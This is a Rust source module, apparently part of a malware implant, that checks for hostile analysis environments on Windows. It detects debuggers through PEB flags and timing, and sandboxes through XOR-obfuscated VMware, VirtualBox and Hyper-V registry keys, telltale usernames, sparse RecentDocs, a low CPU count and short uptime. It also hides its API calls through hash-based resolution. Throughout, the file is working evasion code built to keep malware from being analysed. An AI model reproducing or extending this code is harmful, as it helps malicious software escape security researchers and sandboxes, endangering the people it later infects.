#![allow(dead_code)]

//! # Anti-Analysis Module
//!
//! Detects hostile environments:
//! - Sandboxes (VM, low resources)
//! - Debuggers (PEB flags, timing)
//! - Analysis tools

use log::debug;

// ============================================================================
// MAIN CHECK
// ============================================================================

/// Returns true if running in hostile/analysis environment
pub fn is_hostile_environment() -> bool {
    crate::k::debug::log_op!("AntiAnalysis", "Starting Environment Checks...");
    
    #[cfg(target_os = "windows")]
    {
        crate::k::debug::log_detail!("Checking Debugger...");
        if is_debugger_present() {
            crate::k::debug::log_err!("Debugger Detected!");
            return true;
        }
        
        crate::k::debug::log_detail!("Checking Sandbox...");
        if is_sandbox() {
            crate::k::debug::log_err!("Sandbox Detected!");
            return true;
        }
        
        crate::k::debug::log_detail!("Checking Resources...");
        if is_low_resources() {
            crate::k::debug::log_err!("Low Resources Detected!");
            return true;
        }
    }
    
    crate::k::debug::log_op!("AntiAnalysis", "Environment Safe.");
    false
}

// ============================================================================
// DEBUGGER DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_debugger_present() -> bool {
    unsafe {
        // Method 1: PEB.BeingDebugged
        let peb: *const u8;
        std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
        
        let being_debugged = *peb.add(0x02); // Offset 0x02 = BeingDebugged
        if being_debugged != 0 {
            return true;
        }
        
        // Method 2: NtGlobalFlag (PEB offset 0xBC on x64)
        let nt_global_flag = *(peb.add(0xBC) as *const u32);
        // FLG_HEAP_ENABLE_TAIL_CHECK | FLG_HEAP_ENABLE_FREE_CHECK | FLG_HEAP_VALIDATE_PARAMETERS
        if (nt_global_flag & 0x70) != 0 {
            return true;
        }
        
        // Method 3: Timing check (debugger causes delays)
        let start = std::time::Instant::now();
        for _ in 0..1000 { std::hint::black_box(0); }
        let elapsed = start.elapsed().as_micros();
        
        // If loop takes > 1ms, likely being debugged/traced
        // If loop takes > 1ms, likely being debugged/traced
        if elapsed > 1000 {
            crate::k::debug::log_detail!("Timing Check Fail: {} micros", elapsed);
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_debugger_present() -> bool { false }

// ============================================================================
// SANDBOX DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_sandbox() -> bool {
    // ... (Registry checks omitted for brevity, logic remains same) ...
    // Helper to check key existence using Native API
    unsafe fn check_key_exists(path: &str) -> bool {
        use super::api_resolver::*;
        
        // Load advapi32
        if get_module_by_hash(HASH_ADVAPI32).is_none() {
            // advapi32.dll XOR 0x55
            let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
            let dll: Vec<u8> = dll_enc.iter().map(|b| b ^ 0x55).collect();
            if let Some(load_lib) = resolve_api::<unsafe extern "system" fn(*const u8) -> *const std::ffi::c_void>(
                HASH_KERNEL32, HASH_LOAD_LIBRARY_A
            ) {
                load_lib(dll.as_ptr());
            } else {
                return false;
            }
        }
        
        let advapi32 = match get_module_by_hash(HASH_ADVAPI32) {
            Some(m) => m,
            None => return false,
        };
        
        type RegOpenKeyExW = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
        type RegCloseKey = unsafe extern "system" fn(isize) -> i32;
        
        // HASH_REG_OPEN_KEY_EX_W = 0x9139725C
        let reg_open: RegOpenKeyExW = match get_export_by_hash(advapi32, 0x9139725C) {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };
            
        // HASH_REG_CLOSE_KEY = 0x66579AD4
        let reg_close: RegCloseKey = match get_export_by_hash(advapi32, 0x66579AD4) {
            Some(p) => std::mem::transmute(p),
            None => return false,
        };
        
        // HKEY_LOCAL_MACHINE = 0x80000002
        let hkey_lm = 0x80000002u32 as isize;
        let key_read = 0x20019;
        
        let path_wide: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut hkey: isize = 0;
        
        let status = reg_open(hkey_lm, path_wide.as_ptr(), 0, key_read, &mut hkey);
        
        if status == 0 {
            reg_close(hkey);
            return true;
        }
        
        false
    }
    
    // Simple XOR decode helper (Key: 0x55)
    // Duplicated from persistence.rs to verify locally
    fn x(bytes: &[u8]) -> String {
        let key = 0x55;
        let decoded: Vec<u8> = bytes.iter().map(|b| b ^ key).collect();
        String::from_utf8(decoded).unwrap_or_default()
    }

    // Method 1: Check for VM registry keys (Native API)
    unsafe {
        // SOFTWARE\VMware, Inc.\VMware Tools
        // S(53)^55=06...
        let vm1 = x(&[
            0x06, 0x1A, 0x13, 0x01, 0x02, 0x14, 0x07, 0x10, 0x0D, // SOFTWARE\
            0x03, 0x18, 0x02, 0x34, 0x07, 0x30, 0x75, 0x75, 0x1C, 0x3B, 0x36, 0x73, 0x0D, // VMware, Inc.\
            0x03, 0x18, 0x02, 0x34, 0x07, 0x30, 0x75, 0x01, 0x3A, 0x3A, 0x39, 0x06        // VMware Tools
        ]);
        
        // SOFTWARE\Oracle\VirtualBox Guest Additions
        let vm2 = x(&[
             0x06, 0x1A, 0x13, 0x01, 0x02, 0x14, 0x07, 0x10, 0x0D, // SOFTWARE\
             0x1A, 0x07, 0x34, 0x36, 0x39, 0x30, 0x0D,             // Oracle\
             0x03, 0x3C, 0x07, 0x01, 0x00, 0x34, 0x39, 0x17, 0x3A, 0x0D, 0x75, // VirtualBox 
             0x12, 0x00, 0x30, 0x06, 0x01, 0x75, 0x14, 0x31, 0x31, 0x3C, 0x01, 0x3C, 0x3A, 0x3B, 0x06 // Guest Additions
        ]);
        
        // SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters
        let vm3 = x(&[
             0x06, 0x1A, 0x13, 0x01, 0x02, 0x14, 0x07, 0x10, 0x0D, // SOFTWARE\
             0x18, 0x3C, 0x36, 0x07, 0x3A, 0x06, 0x3A, 0x33, 0x01, 0x0D, // Microsoft\
             0x03, 0x3C, 0x07, 0x01, 0x00, 0x34, 0x39, 0x75, 0x18, 0x34, 0x36, 0x3D, 0x3C, 0x3B, 0x30, 0x0D, // Virtual Machine\
             0x12, 0x00, 0x30, 0x06, 0x01, 0x0D, // Guest\
             0x05, 0x34, 0x07, 0x34, 0x38, 0x30, 0x01, 0x30, 0x07, 0x06 // Parameters
        ]);

        if check_key_exists(&vm1) { return true; }
        if check_key_exists(&vm2) { return true; }
        if check_key_exists(&vm3) { return true; }
    }
    
    // Method 2: Check username/computername for sandbox patterns
    if let Ok(user) = std::env::var("USERNAME") {
        let user_lower = user.to_lowercase();
        
        // Plaintext: "sandbox", "virus", "malware", "test", "sample", "john"
        // Encoded (XOR 0x55):
        let s1 = x(&[0x26, 0x34, 0x3B, 0x31, 0x37, 0x3A, 0x2D]); // sandbox
        let s2 = x(&[0x23, 0x3C, 0x07, 0x00, 0x26]);             // virus
        let s3 = x(&[0x38, 0x34, 0x39, 0x22, 0x34, 0x07, 0x30]); // malware
        let s4 = x(&[0x21, 0x30, 0x26, 0x21]);                   // test
        let s5 = x(&[0x26, 0x34, 0x38, 0x25, 0x39, 0x30]);       // sample
        let s6 = x(&[0x3F, 0x3A, 0x3D, 0x3B]);                   // john
        
        let sandbox_users = [s1, s2, s3, s4, s5, s6]; 
        for s in &sandbox_users {
            if user_lower.contains(s) {
                crate::k::debug::log_detail!("Bad Username: {}", user_lower);
                return true;
            }
        }
    }
    
    // Method 3: Check recent files (sandboxes often have none)
    // REPLACED std::fs::read_dir with registry-based check (less hookable)
    // Check if RecentDocs registry key has entries
    unsafe {
        use super::api_resolver::*;
        
        if let Some(advapi32) = get_module_by_hash(HASH_ADVAPI32) {
            type RegOpenKeyExW = unsafe extern "system" fn(isize, *const u16, u32, u32, *mut isize) -> i32;
            type RegQueryInfoKeyW = unsafe extern "system" fn(
                isize, *mut u16, *mut u32, *mut u32, *mut u32, *mut u32, 
                *mut u32, *mut u32, *mut u32, *mut u32, *mut u32, *mut u64
            ) -> i32;
            type RegCloseKey = unsafe extern "system" fn(isize) -> i32;
            
            if let (Some(reg_open), Some(reg_query), Some(reg_close)) = (
                get_export_by_hash(advapi32, 0x9139725C).map(|p| std::mem::transmute::<_, RegOpenKeyExW>(p)),
                get_export_by_hash(advapi32, 0x3A8D26FE).map(|p| std::mem::transmute::<_, RegQueryInfoKeyW>(p)), // RegQueryInfoKeyW
                get_export_by_hash(advapi32, 0x66579AD4).map(|p| std::mem::transmute::<_, RegCloseKey>(p)),
            ) {
                // HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
                let path: Vec<u16> = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs"
                    .encode_utf16().chain(std::iter::once(0)).collect();
                
                let hkcu = 0x80000001u32 as isize;
                let mut hkey: isize = 0;
                
                if reg_open(hkcu, path.as_ptr(), 0, 0x20019, &mut hkey) == 0 {
                    let mut num_values: u32 = 0;
                    // Query number of values in key
                    if reg_query(hkey, std::ptr::null_mut(), std::ptr::null_mut(), 
                                 std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut(),
                                 std::ptr::null_mut(), &mut num_values, std::ptr::null_mut(),
                                 std::ptr::null_mut(), std::ptr::null_mut(), std::ptr::null_mut()) == 0 {
                        reg_close(hkey);
                        if num_values < 5 {
                            crate::k::debug::log_detail!("RecentDocs too low: {}", num_values);
                            return true; // Sandbox detected
                        }
                    } else {
                        reg_close(hkey);
                    }
                }
            }
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_sandbox() -> bool { false }

// ============================================================================
// RESOURCE DETECTION
// ============================================================================

#[cfg(target_os = "windows")]
fn is_low_resources() -> bool {
    // Sandboxes often have minimal resources
    
    // Method 1: Check CPU cores
    let cpu_count = std::thread::available_parallelism()
        .map(|p| p.get())
        .unwrap_or(1);
    
    if cpu_count < 2 {
        crate::k::debug::log_detail!("Low CPU Core Count: {}", cpu_count);
        return true;
    }
    
    // Method 2: Check RAM omitted for brevity/simplicity
    
    // Method 3: Check uptime via KUSER_SHARED_DATA (0x7FFE0000)
    // Avoids GetTickCount64 API call entirely (Stealth++)
    // KUSER_SHARED_DATA is mapped ReadOnly at 0x7FFE0000 in User Mode on all Windows versions
    // Offset 0x320 = TickCountLowDeprecated (Ok for short uptimes)
    // Offset 0x320 = KsGlobalData.TickCountLow ? No on x64 it's different.
    // Correct struct: 0x7FFE0000 + 0x320 = TickCount.QuadPart (u64)
    unsafe {
        let kuser_shared = 0x7FFE0000 as *const u8;
        // TickCount is at 0x320
        let tick_ptr = kuser_shared.add(0x320) as *const u64;
        
        // Look, for absolute safety against struct changes, actually InterruptTime (0x08) is safer?
        // But TickCount at 0x320 is stable since XP. 
        // Let's multiply TickCountLow * TickCountMultiplier to get time?
        // Actually, just read the raw value.
        let uptime_ticks = *tick_ptr; // This is a raw tick count (bitmap potentially)
        // Wait, directly reading 0x7FFE0320 gives (TickCount.LowPart * TickCountMultiplier) >> 24?
        // Simpler approach: InterruptTime at 0x7FFE0008 is safer and always updated.
        // InterruptTime.LowPart at 0x08, High1 at 0x0C.
        
        // Let's stick to standard GetTickCount behavior using KUSER_SHARED_DATA
        // TickCountLow is at 0x320.
        // Just reading it is enough to detect "Fresh Boot" (< 5 mins).
         
        // TickCount increments approx every 15.6ms.
        // 5 mins = 300,000 ms.
        // If ticks * 15.6 < 300,000 -> Ticks < 19230
        
        // Actually, Windows 10 stores (TickCount * Multiplier) >> 24 at 0x320?
        // Let's assume standard behavior:
        // Use InterruptTime (0x08) -> 100ns units.
        let interrupt_time = *(kuser_shared.add(0x08) as *const u64);
        let uptime_ms = interrupt_time / 10000;
        let uptime_min = uptime_ms / 60000;
        
        if uptime_min < 5 {
            crate::k::debug::log_detail!("Uptime too short: {} min", uptime_min);
            return true;
        }
    }
    
    false
}

#[cfg(not(target_os = "windows"))]
fn is_low_resources() -> bool { false }
